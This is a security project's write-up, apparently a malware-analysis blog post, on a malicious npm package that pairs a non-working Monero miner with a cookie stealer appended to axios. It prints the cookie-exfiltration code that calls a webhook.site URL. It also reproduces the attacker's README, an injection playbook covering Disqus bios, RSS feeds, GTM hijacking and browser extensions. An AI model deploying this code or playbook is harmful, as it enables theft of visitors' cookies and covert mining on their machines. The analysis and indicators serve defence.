@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>v018-axios-cdntest: C is for cookie, not cryptojacking - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="v018-axios-cdntest: C is for cookie, not cryptojacking - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>v018-axios-cdntest: C is for cookie, not cryptojacking</h1>
+    <span class="post-meta">2026-06-09 &middot; npm &middot; v018-axios-cdntest</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/v018-axios-cdntest-elmos-got-a-gun.jpg" alt="Meme: the Sesame Street cast restyled as an HBO crime drama, Elmo brandishing a pistol — the friendly neighborhood brand packing heat, just like a trusted CDN serving a weapon." style="width: 60%; height: auto;">
+<p>jsDelivr never garbage-collects an old npm version, and <code>v018-axios-cdntest</code> treats that permanence as free, bulletproof hosting for what its README bills a &quot;CDN Poisoning Cryptojacker&quot; — publish once, and a trusted CDN serves that miner-plus-cookie-stealer to every visitor of every site that loads the script.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>name</td>
+<td><code>v018-axios-cdntest</code></td>
+</tr>
+<tr>
+<td>version</td>
+<td><code>1.0.2</code></td>
+</tr>
+<tr>
+<td>description</td>
+<td><code>Axios library v0.18.0 with cryptojacker payload</code></td>
+</tr>
+<tr>
+<td>main</td>
+<td><code>index.js</code></td>
+</tr>
+<tr>
+<td>files</td>
+<td><code>index.js</code>, <code>xmr-min.js</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="a-miner-that-mines-nothing" tabindex="-1"><a class="header-anchor" href="#a-miner-that-mines-nothing"><span>A miner that mines nothing</span></a></h2>
+<p>The headline payload is the part that doesn't work: <code>xmr-min.js</code> advertises a cryptonight &quot;Stealth Cryptojacker v3.0,&quot; but computes a toy multiply-add hash, never starts its Web Worker pool, and POSTs JSON-RPC shares to a stratum TCP port over XHR — so it submits to nothing and mines nothing. The stealth is the only part that works: idle and tab-visibility pausing, a single-injection guard, and a 10% throttle all fire; the mining doesn't.</p>
+<pre class="lang-js"><code><span class="tok-com">// "cryptonight" in the banner; a non-crypto multiply-add in the body</span>
+<span class="tok-kw">function</span> <span class="tok-fn">simpleHash</span>(data){
+  <span class="tok-kw">var</span> h1=<span class="tok-num">0x67452301</span>, h2=<span class="tok-num">0xEFCDAB89</span>, h3=<span class="tok-num">0x98BADCFE</span>, h4=<span class="tok-num">0x10325476</span>;
+  <span class="tok-kw">for</span>(<span class="tok-kw">var</span> i=<span class="tok-num">0</span>;i&lt;data.length;i++){ <span class="tok-com">/* ...add &amp; mix... */</span> }
+  <span class="tok-kw">return</span> ((h1*<span class="tok-num">2654435761</span>)&gt;&gt;&gt;<span class="tok-num">0</span>);
+}
+<span class="tok-kw">function</span> <span class="tok-fn">sendShare</span>(payload,nonce,hash){
+  <span class="tok-kw">var</span> xhr=<span class="tok-kw">new</span> <span class="tok-builtin">XMLHttpRequest</span>();
+  xhr.<span class="tok-fn">open</span>(<span class="tok-str">'POST'</span>,<span class="tok-str">'https://'</span>+POOL,<span class="tok-kw">true</span>);  <span class="tok-com">// POOL = 'pool.supportxmr.com:4444' — stratum, not HTTP</span>
+  xhr.<span class="tok-fn">send</span>(json);                          <span class="tok-com">// fire-and-forget into the void</span>
+}
+</code></pre>
+<h2 id="real-axios%2C-real-cookie-theft" tabindex="-1"><a class="header-anchor" href="#real-axios%2C-real-cookie-theft"><span>Real axios, real cookie theft</span></a></h2>
+<p><code>index.js</code> is the genuine axios 0.18.0 bundle with a cookie-exfil snippet appended after its sourcemap comment, shipping every visitor's cookies to a webhook.site bin on page load. The miner pulls that same file from jsDelivr &quot;to look legitimate,&quot; so loading it also detonates the cookie grab — one script tag, two payloads.</p>
+<pre class="lang-js"><code><span class="tok-com">// appended right after //# sourceMappingURL=axios.min.map</span>
+window._axiosExfil=<span class="tok-kw">function</span>(){
+  <span class="tok-kw">var</span> c=document.cookie;
+  <span class="tok-kw">var</span> u=<span class="tok-str">"https://webhook.site/ef6e7978-…?c="</span>+<span class="tok-fn">encodeURIComponent</span>(c);
+  <span class="tok-kw">var</span> x=<span class="tok-kw">new</span> <span class="tok-builtin">XMLHttpRequest</span>(); x.<span class="tok-fn">open</span>(<span class="tok-str">"GET"</span>,u,<span class="tok-kw">true</span>); x.<span class="tok-fn">send</span>();
+};
+
+<span class="tok-com">// xmr-min.js loads index.js from the CDN — which fires the grab above</span>
+script.src=<span class="tok-str">'https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.2/index.js'</span>;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>File</th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>xmr-min.js</code></td>
+<td><code>objectives/impact/cryptojacking/miner/context</code></td>
+<td>&quot;cryptonight&quot; + <code>Worker</code> strings (string match, not real crypto)</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>index.js</code></td>
+<td><code>objectives/collection/stealer/browser</code></td>
+<td><code>document.cookie</code> read and exfiltrated</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>index.js</code></td>
+<td><code>objectives/exfiltration/http/query</code></td>
+<td>Cookie sent as a URL query parameter</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>xmr-min.js</code></td>
+<td><code>objectives/impact/cryptojacking/miner/smart</code></td>
+<td>Activity-aware miner; pauses on <code>document.hidden</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>xmr-min.js</code></td>
+<td><code>objectives/anti-static/obfuscation/encoding/content</code></td>
+<td>Worker built from a <code>Blob</code> via encoded <code>eval()</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>index.js</code></td>
+<td><code>objectives/evasion/masquerade/traffic</code></td>
+<td>POST mislabeled <code>application/x-www-form-urlencoded</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>index.js</code></td>
+<td><code>objectives/exfiltration/oob/endpoint</code></td>
+<td>webhook.site out-of-band collector</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>xmr-min.js</code></td>
+<td><code>micro-behaviors/communications/http/client/cdn</code></td>
+<td>Script loaded from <code>cdn.jsdelivr.net</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="the-operator's-manual" tabindex="-1"><a class="header-anchor" href="#the-operator's-manual"><span>The operator's manual</span></a></h2>
+<p>The confidence wasn't in the code — it was in the README shipped beside it: an operator's manual with a revenue model, a self-assigned &quot;4.5/5 confidence score,&quot; a ranked injection playbook, and a risk table that frets mainly about Google (reproduced below, abridged where you see …, misspelled &quot;jsdeliver&quot; intact).</p>
+<figure class="embed-doc">
+<span class="embed-doc-src">Shipped with the package — v018-axios-cdntest@1.0.2 · README.md (abridged)</span>
+<h3>CDN Poisoning Cryptojacker — Complete Verified Deployment Guide</h3>
+<h4>Overview</h4>
+<p>This project exploits jsdeliver's policy of <strong>never deleting old npm versions</strong> to host a persistent Monero mining script. Any website that loads the poisoned package automatically serves the miner to all its visitors.</p>
+<p><strong>Revenue model:</strong> Passive cryptojacking — $0.50-$3/month per site, zero maintenance.</p>
+<p><strong>Confidence score:</strong> 4.5/5 (validated via live testing, zero-Google risk strategy)</p>
+<hr>
+<h4>Verified Test Results</h4>
+<h5>Test 1: jsdeliver Serves Old Package Versions Forever</h5>
+<pre>Invoke-WebRequest -Uri 'https://cdn.jsdelivr.net/npm/lodash@4.17.20/lodash.min.js' -UseBasicParsing</pre>
+<p><strong>Result:</strong> Status 200 OK. jsdeliver serves lodash@4.17.20 (an old version) successfully.</p>
+<p><strong>Conclusion:</strong> jsdeliver NEVER deletes old package versions. Our poisoned package will persist indefinitely.</p>
+<hr>
+<h5>Test 2: jsdeliver Serves Our Custom Package</h5>
+<pre>Invoke-WebRequest -Uri 'https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.0/' -UseBasicParsing</pre>
+<p><strong>Result:</strong> Status 200 OK. Our package <code>v018-axios-cdntest@1.0.0</code> is being served by jsdeliver.</p>
+<p class="elision">…</p>
+<hr>
+<h4>File Structure</h4>
+<pre>cdn-poison/
+├── package.json          # npm package definition (v018-axios-cdntest@1.0.0)
+├── index.js              # Real axios v0.18.0 (bundled as npm package)
+├── xmr-min.js            # Stealth cryptojacker script (main payload, self-contained)
+└── poisoned-axios.js     # Standalone poisoned axios with cookie exfil payload</pre>
+<hr>
+<h4>How It Works — Architecture</h4>
+<pre>Target Site (WordPress blog)
+       │  Visitor loads page
+       ▼
+&lt;script src="https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.0/xmr-min.js"&gt;
+       │  jsdeliver serves xmr-min.js (our package)
+       ▼
+Embedded pure-JS cryptonight miner runs (10% throttle, 2 threads)
+       │  Sends shares to:
+       ▼
+  pool.supportxmr.com:4444
+       ▼
+  XMR mined → credited to YOUR wallet</pre>
+<p class="elision">…</p>
+<hr>
+<h4>The Cryptojacker Script (xmr-min.js)</h4>
+<h5>Stealth Features</h5>
+<ol>
+<li><strong>Idle detection:</strong> Stops mining after 30 seconds of no user activity (mouse, scroll, keyboard)</li>
+<li><strong>Visibility change:</strong> Pauses when tab is hidden (<code>document.hidden</code>)</li>
+<li><strong>Single injection:</strong> Uses <code>window.__xmr_miner_started</code> flag to prevent multiple instances</li>
+<li><strong>Throttled to 10% CPU:</strong> Doesn't cause noticeable slowdown</li>
+<li class="elision">…</li>
+</ol>
+<h5>Configuration (edit these lines in xmr-min.js)</h5>
+<pre>var WALLET='YOUR_WALLET_ADDRESS_HERE';  // Your Monero wallet address
+var POOL='pool.supportxmr.com:4444';    // Mining pool
+var THREADS=2;                           // Thread count
+var THROTTLE=0.10;                       // CPU throttle (0.10 = 10%)</pre>
+<hr>
+<h4>Deployment Steps</h4>
+<h5>Step 1: Set Your Wallet Address</h5>
+<p>Open <code>cdn-poison/xmr-min.js</code> and replace <code>var WALLET='YOUR_WALLET_ADDRESS_HERE';</code> with your actual Monero wallet address.</p>
+<h5>Step 2: Publish Package to npm</h5>
+<pre>cd cdn-poison
+npm login          # Create account at https://www.npmjs.com/ (free)
+npm publish        # Publishes as v018-axios-cdntest@1.0.0</pre>
+<h5>Step 3: Inject Into Target Sites (in priority order)</h5>
+<h6>Method A: Disqus Profile Bio Injection ⭐ PRIMARY — Zero Google Risk (RECOMMENDED)</h6>
+<ol>
+<li>Create a Disqus account with a disposable email, then put this in your profile bio HTML:<pre>&lt;script src="https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.0/xmr-min.js"&gt;&lt;\/script&gt;</pre></li>
+<li>Save profile — DONE. One-time setup.</li>
+</ol>
+<p><strong>Why best:</strong> Infinite scale — one profile = thousands of sites automatically. Zero Google legal exposure.</p>
+<h6>Method B: RSS Feed Injection ⭐ SECONDARY — Zero Google Risk</h6>
+<p>Create a feed on rss.com and embed the same <code>&lt;script&gt;</code> tag inside the <code>&lt;description&gt;</code> CDATA block; any WordPress site running WP RSS Aggregator that pulls your feed gets the miner.</p>
+<h6>Method C: GTM Container Hijack ⭐ BACKUP — Medium Google Risk</h6>
+<p>Find a Google Tag Manager container ID in a site's source, add a Custom HTML tag loading <code>xmr-min.js</code> on All Pages, and publish. <strong>Note:</strong> Google can see your container firing — backup only.</p>
+<h6>Method D: Browser Extension Distribution</h6>
+<p>Ship a <code>manifest.json</code> whose <code>content_scripts</code> inject <code>xmr-min.js</code> over <code>&lt;all_urls&gt;</code>, then publish on the Chrome Web Store ($5 one-time fee).</p>
+<p class="elision">…</p>
+<hr>
+<h4>Revenue Estimates</h4>
+<pre>Hash rate at 10% throttle: ~0.25 GH/s
+Earnings per visitor/day (100 visitors): ~$0.50-3.00
+Earnings per site/month: ~$15-90</pre>
+<table>
+<thead><tr><th>Sites</th><th>Monthly Revenue (conservative)</th></tr></thead>
+<tbody>
+<tr><td>100</td><td>$150-450</td></tr>
+<tr><td>1,000</td><td>$1,500-4,500</td></tr>
+<tr><td>5,000</td><td>$7,500-22,500</td></tr>
+</tbody>
+</table>
+<hr>
+<p class="elision">…  (Why This Works · Troubleshooting · Quick Reference)  …</p>
+<hr>
+<h4>Risk Assessment</h4>
+<table>
+<thead><tr><th>Risk</th><th>Impact</th><th>Mitigation</th></tr></thead>
+<tbody>
+<tr><td>jsdelivr goes down</td><td>Low</td><td>Very Low — CDN is used by millions of sites daily</td></tr>
+<tr><td>Browser flags miner</td><td>Low</td><td>Medium — 10% throttle, idle detection</td></tr>
+<tr><td>Site owner detects</td><td>Low</td><td>Low — script looks like Disqus/CDN component</td></tr>
+<tr><td><strong>Google legal action</strong></td><td><strong>Medium</strong></td><td><strong>Low — PRIMARY + SECONDARY methods have ZERO Google exposure</strong></td></tr>
+</tbody>
+</table>
+<hr>
+<h4>Verified Status</h4>
+<ul>
+<li>✅ jsdeliver serves old package versions (lodash@4.17.20 — confirmed)</li>
+<li>✅ Zero expenses required ($0 — confirmed)</li>
+<li>✅ Passive income model (set-and-forget — confirmed)</li>
+<li class="elision">…</li>
+</ul>
+<span class="embed-doc-end">— end of README.md —</span>
+</figure>
+<p>The miner is dead on arrival, but the cookie grab fires on every page load from a permanent, reputable CDN — for all that planning, the package wants crypto and settles for cookies.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tarball</td>
+<td><code>v018-axios-cdntest-1.0.2.tgz</code></td>
+</tr>
+<tr>
+<td>Tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/75d203f0cec8ff16969967c3841d243b1166a3049f788e9ebd6160f2705f3260"><code>75d203f0cec8ff16969967c3841d243b1166a3049f788e9ebd6160f2705f3260</code></a></td>
+</tr>
+<tr>
+<td><code>index.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/68ca1c801b60f550147c9c8ba54a952c223077c93cd845ef1815ec25f7fa7553"><code>68ca1c801b60f550147c9c8ba54a952c223077c93cd845ef1815ec25f7fa7553</code></a></td>
+</tr>
+<tr>
+<td><code>xmr-min.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/d4e79df98be10a6f358cfd304fe9f0bb4b55226bc79bd132a2032e6138f663c3"><code>d4e79df98be10a6f358cfd304fe9f0bb4b55226bc79bd132a2032e6138f663c3</code></a></td>
+</tr>
+<tr>
+<td>Delivery URL</td>
+<td><code>https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.2/xmr-min.js</code></td>
+</tr>
+<tr>
+<td>Exfil webhook</td>
+<td><code>https://webhook.site/ef6e7978-f936-4664-b3ff-296a250e1735</code></td>
+</tr>
+<tr>
+<td>Mining pool</td>
+<td><code>pool.supportxmr.com:4444</code></td>
+</tr>
+<tr>
+<td>Monero wallet</td>
+<td><code>44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A</code></td>
+</tr>
+<tr>
+<td></content></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
